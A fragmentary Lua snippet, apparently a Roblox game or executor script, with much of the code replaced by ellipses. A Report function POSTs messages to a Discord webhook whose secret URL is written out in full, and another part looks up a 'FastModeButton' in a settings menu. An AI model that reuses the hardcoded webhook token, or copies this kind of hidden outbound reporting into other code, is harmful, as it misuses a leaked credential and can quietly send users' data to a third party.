(function() 
    ...
    function Report(Message) 
        if true then 
            ...
            local success2, response = pcall(function()
                return request({
                    Url = "https://discord.com/api/webhooks/1515677479065485313/kZ9dJTnAo-ZFh0XxGODAu8KNCWC7MX1-nsZVljzDm971lRKBk1YPbPaOqKZNrZLH20IB",
                    Method = "POST",
    ...
    spawn(function() 
        ...
        pcall(function()
            ...
            local buttons = settings and settings:FindFirstChild("Buttons")
            local fastBtn = buttons and buttons:FindFirstChild("FastModeButton")
            if fastBtn then
